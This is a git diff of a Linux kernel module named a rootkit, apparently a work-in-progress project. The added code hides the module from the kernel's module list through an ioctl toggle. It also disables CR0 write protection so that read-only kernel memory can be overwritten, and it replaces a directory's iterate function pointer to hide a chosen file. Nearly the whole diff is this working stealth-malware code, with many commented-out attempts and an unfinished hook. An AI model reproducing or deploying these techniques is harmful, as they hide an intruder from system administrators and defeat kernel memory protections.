@@ -24,7 +24,7 @@ MODULE_AUTHOR("Kha");
 static int device_open_num = 0;
 static char msg[BUF_LEN];
 static char *msg_ptr;
-
+static bool hide = false;
 //static int device_open (struct inode *, struct file *);
 //static int device_release (struct inode*, struct file*);
 //static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
@@ -89,6 +89,24 @@ static int device_release(struct inode *inode, struct file *file)
   return SUCCESS;
 }
 
+struct list_head *module_list_prev;
+struct list_head *module_list_next;
+static void hide_module(void){
+   /*Hide the module*/
+  printk(KERN_INFO "Hiding module");
+  module_list_prev = (&__this_module.list)->prev;
+  module_list_next = (&__this_module.list)->next;
+  list_del_init(&__this_module.list);
+  // module_list = THIS_MODULE->list.prev;
+  //list_del(module_list);
+  //kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+static void unhide_module(void){
+  printk (KERN_INFO "Unhiding module");
+  //list_add(&__this_module.list, module_list_prev);
+  //list_add_tail(&__this_module.list, module_list_next);
+  __list_add(&__this_module.list, module_list_prev, module_list_next);
+}
 static ssize_t device_ioctl(	/* see include/linux/fs.h */
 			    struct file *file,	/* ditto */
 			    unsigned int ioctl_num,	/* number and param for ioctl */
@@ -136,8 +154,19 @@ static ssize_t device_ioctl(	/* see include/linux/fs.h */
   case IOCTL_GET_NTH_BYTE:
     return msg[ioctl_param];
     break;
+    
+  case IOCTL_TOGGLE_HIDE_MODULE:
+    hide = !hide;
+    if(hide)
+      hide_module();
+    else
+      unhide_module();
+    //hide = !hide;
+    return SUCCESS;
+    break;
+    
   }
-
+    
   return SUCCESS;
 }
 
@@ -346,31 +375,33 @@ static int new_parent_iterate(struct file *, struct dir_context *);
 static struct file_operations new_parent_fops = {
 						 .iterate = new_parent_iterate,
 };
+int (*original_iterate)(struct file *file, struct dir_context *context);
 
 static int new_parent_iterate(struct file *file, struct dir_context *context){
   printk(KERN_INFO "New iterate!!!!!!!!!\n");
   int ret = 0;
   //printk(KERN_INFO "f_op -> iterate: %p\n", file->f_op->iterate);
   //printk(KERN_INFO "original_iterate: %p\n", original_iterate);
-  original_filldir = context->actor;
+  // original_filldir = context->actor;
   //g_parent_dentry = file->f_path.dentry;
   //*((filldir_t*)&context->actor) = new_parent_filldir;
   //ret = g_root_path.dentry->d_inode->i_fop->iterate(file, context);
   // ret = file->f_path.dentry->d_inode->i_fop->iterate(file, context);
 
   // Unhook
-  g_parent_dentry->d_inode->i_fop = original_parent_fops;
+  // g_parent_dentry->d_inode->i_fop = original_parent_fops;
   // Original function
   // ret = original_parent_fops->iterate(file,context);
   //ret =  g_parent_dentry->d_inode->i_fop->iterate(file,context);
   // ret = file->f_op->iterate(file,context);
   // Rehook
-  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
+  //g_parent_dentry->d_inode->i_fop.iterate = &new_parent_fops;
 
   //ret = file->f_op->iterate(file,context);
   // ret = original_iterate(file,context);
   // ret = original_fops->iterate(file,context);
-  return ret;
+  return original_iterate(file,context);
+  //return 0;
 }
 
 	  
@@ -384,7 +415,31 @@ static int new_parent_iterate(struct file *file, struct dir_context *context){
     preempt_enable();				\
     write_cr0(read_cr0() | 0x10000);		\
   } while (0);
+static inline void
+write_cr0_forced(unsigned long val)
+{
+  unsigned long __force_order;
+  
+  /* __asm__ __volatile__( */
+  asm volatile(
+	       "mov %0, %%cr0"
+	       : "+r"(val), "+m"(__force_order));
+}
 
+static inline void
+protect_memory(void)
+{
+  printk(KERN_INFO "Protecting memory");
+  write_cr0_forced(read_cr0()|0x00010000);
+}
+
+static inline void
+unprotect_memory(void)
+{
+  printk(KERN_INFO "Unprotecting  memory");
+  unsigned long cr0 = read_cr0();
+  write_cr0_forced(cr0 & ~0x00010000);
+}
 static int hide_file_hook (const char* file_path){
   int error = 0;
   //struct file* file;
@@ -423,11 +478,25 @@ static int hide_file_hook (const char* file_path){
   //original_iterate = path.dentry->d_parent->d_inode->i_fop->iterate;
   
   g_parent_dentry = path.dentry->d_parent;
+  //original_parent_fops = g_parent_dentry->d_inode->i_fop;
+  //original_iterate = g_parent_dentry->d_inode->i_fop->iterate;
+  //  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
+  //DISABLE_W_PROTECTED_MEMORY
+  printk(KERN_INFO "new_parent_iterate: %p\n",&new_parent_iterate);
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
 
-  original_parent_fops = g_parent_dentry->d_inode->i_fop;
-  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
 
-  //&g_root_path.dentry->d_inode->i_fop = &new_parent_fops;
+  unprotect_memory();
+
+  unsigned long * ptr = (unsigned long *) &g_parent_dentry->d_inode->i_fop->iterate;
+  //printk(KERN_INFO "ptr: %p\n",ptr);
+  *ptr = (unsigned long *) &new_parent_iterate; 
+  //g_parent_dentry->d_inode->i_fop->iterate = &new_parent_iterate;
+  //ENABLE_W_PROTECTED_MEMORY;
+  protect_memory();
+  //printk(KERN_INFO "ptr: %p\n",*ptr);
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
+  
   //path.dentry->d_parent->d_inode->i_fop->iterate = &new_parent_iterate;
   //ENABLE_W_PROTECTED_MEMORY
   //DISABLE_W_PROTECTED_MEMORY
@@ -453,21 +522,18 @@ static int backup_hooks (void){
   return SUCCESS;
 }
 
-static char* test_path_name = "/home/dalo2903/test.c";
+static char* test_path_name = "/home/dalo2903/Test/test.c";
 
 // Rootkit init & exit
 static int __init rootkit_init(void)
 {
   int ret_val;
-
+  // list_del_init(&__this_module.list);
   ret_val = hide_file_hook(test_path_name);
   if (ret_val < 0){
     printk(KERN_ALERT "Hook failed\n");
     return ret_val;
   }
-  /*Hide the module*/
-  /* list_del_init(&__this_module.list); */
-  /* kobject_del(&THIS_MODULE->mkobj.kobj); */
  
   ret_val = register_chrdev(MAJOR_NUM, DEVICE_FILE_NAME, &fops);
   if (ret_val < 0) {
